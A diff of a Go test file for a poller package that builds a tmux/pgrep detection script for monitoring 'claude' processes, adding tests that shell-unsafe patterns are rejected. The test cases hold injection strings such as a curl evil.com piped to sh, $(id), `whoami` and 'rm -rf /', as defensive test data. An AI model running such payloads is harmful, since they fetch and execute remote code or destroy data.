@@ -1,6 +1,7 @@
 package poller
 
 import (
+	"strings"
 	"testing"
 )
 
@@ -38,21 +39,20 @@ func TestParseDetectionOutput(t *testing.T) {
 func TestBuildDetectionScript(t *testing.T) {
 	script := BuildDetectionScript([]string{"Y/n", "y/N", "Permission"})
 
-	// Should contain the patterns in a grep expression
-	if got := script; got == "" {
+	if script == "" {
 		t.Fatal("script should not be empty")
 	}
 
 	// Verify patterns are included
 	for _, p := range []string{"Y/n", "y/N", "Permission"} {
-		if !contains(script, p) {
+		if !strings.Contains(script, p) {
 			t.Errorf("script should contain pattern %q", p)
 		}
 	}
 
 	// Verify basic structure
 	for _, fragment := range []string{"pgrep -a claude", "tmux capture-pane", "WAITING", "WORKING", "FINISHED", "ERROR"} {
-		if !contains(script, fragment) {
+		if !strings.Contains(script, fragment) {
 			t.Errorf("script should contain %q", fragment)
 		}
 	}
@@ -60,21 +60,61 @@ func TestBuildDetectionScript(t *testing.T) {
 
 func TestBuildDetectionScript_EmptyPatterns(t *testing.T) {
 	script := BuildDetectionScript([]string{})
-	// Should still produce a valid script with empty pattern group
 	if script == "" {
 		t.Fatal("script should not be empty even with no patterns")
 	}
-}
-
-func contains(s, substr string) bool {
-	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsCheck(s, substr))
-}
-
-func containsCheck(s, substr string) bool {
-	for i := 0; i <= len(s)-len(substr); i++ {
-		if s[i:i+len(substr)] == substr {
-			return true
-		}
+	// Should contain a never-match pattern
+	if !strings.Contains(script, "NEVER_MATCH") {
+		t.Error("empty patterns should produce never-match fallback")
 	}
-	return false
+}
+
+func TestShellEscapePattern(t *testing.T) {
+	tests := []struct {
+		name    string
+		pattern string
+		wantErr bool
+	}{
+		{"simple text", "Y/n", false},
+		{"prompt chars", "Permission denied", false},
+		{"regex chars", "[Yy]/[Nn]", false},
+		{"shell injection", `"); curl evil.com | sh; echo ("`, true},
+		{"backticks", "`whoami`", true},
+		{"dollar expansion", "$(id)", true},
+		{"semicolon", "foo; rm -rf /", true},
+		{"newline", "foo\nbar", true},
+		{"single quotes", "it's", true},
+		{"double quotes", `"hello"`, true},
+		{"empty", "", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := shellEscapePattern(tt.pattern)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("shellEscapePattern(%q) error = %v, wantErr %v", tt.pattern, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestBuildDetectionScript_SkipsUnsafePatterns(t *testing.T) {
+	script := BuildDetectionScript([]string{
+		"Y/n",
+		`"); curl evil.com | sh; echo ("`,
+		"Permission",
+	})
+
+	// Safe patterns should be present
+	if !strings.Contains(script, "Y/n") {
+		t.Error("script should contain safe pattern Y/n")
+	}
+	if !strings.Contains(script, "Permission") {
+		t.Error("script should contain safe pattern Permission")
+	}
+
+	// Unsafe pattern should NOT be present
+	if strings.Contains(script, "curl") {
+		t.Error("script should not contain unsafe pattern")
+	}
 }
